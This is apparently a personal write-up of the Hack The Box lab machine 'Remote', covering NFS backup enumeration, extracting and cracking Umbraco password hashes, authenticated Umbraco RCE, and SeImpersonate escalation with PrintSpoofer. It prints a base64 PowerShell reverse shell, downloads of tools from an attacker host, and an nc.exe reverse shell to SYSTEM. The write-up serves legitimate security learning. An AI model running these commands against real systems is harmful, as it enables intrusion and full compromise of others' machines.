---
created: 2025-08-28
---

📅 `2025-08-28`

#nfs #database #hashcat #cve #impersonate-privileges

----

## 🖥️ Box Info

| ️🏷️ Name         |   `Remote`  |
| --------------- | --- |
| 📆 Release Date |  `2020-03-21`  |
| 🌐 IP Address   |   `10.10.10.180`  |
| 🖥️ OS           |   `Windows`  |
| 🎯 Difficulty   |   `Easy`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `NFS`
- Backup enumeration
- Corrupt database file enumeration
- `RCE` `CVE` in `Umbraco` `CMS`
- `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` privilege escalation with `PrintSpoofer`

**🛠️ Tools:**  

- `strings` + `grep`
- `hashcat`

**📚 Learned:**  

- Copy the remote `NFS` drive locally with `cp -r ...` if possible for easier navigation and to preserve integrity.
- If the database is corrupted, we may still be able to extract data with `strings` + `grep`. If it's a lot of output, pipe it to `less`.
- Port 21 (`FTP`) and `445` were of no use. Even easy machines can have ports that are just rabbit holes (technically, `SMB` was there for the intended privesc with `psexec`).
- I didn't take the intended privilege escalation path, which was abusing a vulnerable version of `TeamViewer` to extract the local admin's password, then logging in as admin with `psexec.py` and this password.
- Try passwords even for the administrator user.
- Look for non-standard installed software. Look for vulnerabilities in that software.

----

## 🌐 Port Scan

- **TCP**: 21, 80, 111, 135, 139, 445, 2049, 5985, ...
- **UDP**: None

---

## 🔍 Enumeration

The website is some sort of online store with lots of working pages.

![[Pasted image 20250828165643.png]]

Going to "Contact", we see this:

![[Pasted image 20250828165713.png]]

Clicking that `URL` redirects us to `http://10.10.10.180/umbraco/#/forms`, which redirects us to a login panel:

![[Pasted image 20250828165759.png]]

This also reveals the web app is using `Umbraco` as its `CMS`.

Remembering port 2049 (`NFS`), I listed the remote mounts available to us.

```shell
showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

This is very interesting. I mounted the share in `/mnt`.

```shell
sudo mount -t nfs 10.10.10.180:/site_backups /mnt
```

And started investigating.

```shell
ls /mnt
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

I copied this entire directory into a new `backup` directory in my box folder, `~/Hacking/Remote/`.

```shell
cp -r /mnt ./backup
```

It looks like the backup is for the `Umbraco` web app.

Looking into where an `Umbraco` installation stores sensitive information, I found that older versions of `Umbraco` have their database in a single file in this path:

```shell
App_Data/Umbraco.sdf
```

Our backup has this file. It's a deprecated `MSSQL` Compact Edition database, and every tool I tried, including runtimes and Visual Studio extensions, reported it as corrupted.

I finally resorted to pulling readable strings out of the file with `strings` + `grep`:

```
$ strings Umbraco.sdf | grep -i htb
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
<SNIP>
```

The output contains password hashes for two users: `admin@htb.local` uses `SHA1`, while `smith` uses `HMACSHA256` keyed with the site's `machineKey`. `Umbraco` has a setting that enables legacy password hashing, which explains why two different algorithms are in use. The `Web.config` file at the root of the backup also shows the `Umbraco` version is `7.12.4`, which is useful when looking for exploits.

---

## 🪜 Foothold / User

I cracked the `admin@htb.local` user's hash with `hashcat` mode `100` for `SHA1`.

```shell
.\hashcat.exe -a 0 -m 100 'b8be16afba8c314ad33d812f22a04991b90e2aaa' .\rockyou.txt -O -w 4

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
```

And logged into the `Umbraco` control panel.

![[Pasted image 20250828170812.png]]

The version was key. `searchsploit` found these:

```shell
$ searchsploit umbraco
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                                                          | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                                                   | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                                                   | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                                                                      | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                                                   | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF                                                                                                                             | aspx/webapps/50462.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There are authenticated `RCE` exploits for the exact version the target runs. The first one wasn't straightforward, so I used the second (49488).

```shell
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
iis apppool\defaultapppool
```

Got `RCE`.

Let's get a reverse shell with the `PowerShell` `base64` payload.

```shell
listen windows 1234
```

```shell
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c 'powershell' -a '-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

>[!note]
>The script's source shows that `-a <arg>` passes arguments to the command.

```shell
listen windows 1234
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.180:50325.

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

And got a shell as user `defaultapppool`.

>[!tip]
>This looks like a service account, so it might have impersonation privileges.

After some enumeration I found the user flag was in `C:\Users\Public\Desktop`.

```shell
PS C:\Users\Public> cd Desktop
PS C:\Users\Public\Desktop> ls


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/20/2020   2:14 AM           1191 TeamViewer 7.lnk                                                      
-ar---        8/26/2025   6:35 PM             34 user.txt                                                              


PS C:\Users\Public\Desktop> cat user.txt
<REDACTED>
```

Got user.

---

## 🛡️ Privilege Escalation

`systeminfo` showed the OS is Windows Server 2019.

```
PS C:\> systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
<SNIP>
```

And enumerated the privileges of my current user:

```shell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

And it did have impersonate privileges. Since it's Windows Server 2019, we can use [[SeImpersonate and SeAssignPrimaryToken#Exploits|PrintSpoofer]] due to the `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`. I [downloaded it](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) and transferred it to the machine, after creating a `C:\Temp` directory.

```shell
PS C:\> mkdir C:\Temp
PS C:\> cd C:\Temp
PS C:\Temp> wget http://10.10.14.11:8000/PrintSpoofer64.exe -outfile ps.exe
```

Also transfer a copy of `netcat` to the machine for the exploit (with the `windows-binaries` command from `Kali`, which takes us to the directory with Windows binaries).

```shell
PS C:\Temp> wget http://10.10.14.11:8000/nc.exe -outfile nc.exe
```

Start another listener:

```shell
listen windows 8443
```

And run the exploit:

```shell
PS C:\Temp> .\ps.exe -c "C:\Temp\nc.exe 10.10.14.11 8443 -e cmd.exe"
```

```shell
listen windows 8443
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.10.10.180:50333.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

And got a shell as `NT AUTHORITY\SYSTEM`.

```shell
C:\Windows\system32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is D582-9880

 Directory of C:\Users\Administrator\Desktop

02/20/2020  03:41 AM    <DIR>          .
02/20/2020  03:41 AM    <DIR>          ..
08/26/2025  06:35 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  12,918,874,112 bytes free

C:\Users\Administrator\Desktop>type root.txt
<REDACTED>
```

Rooted.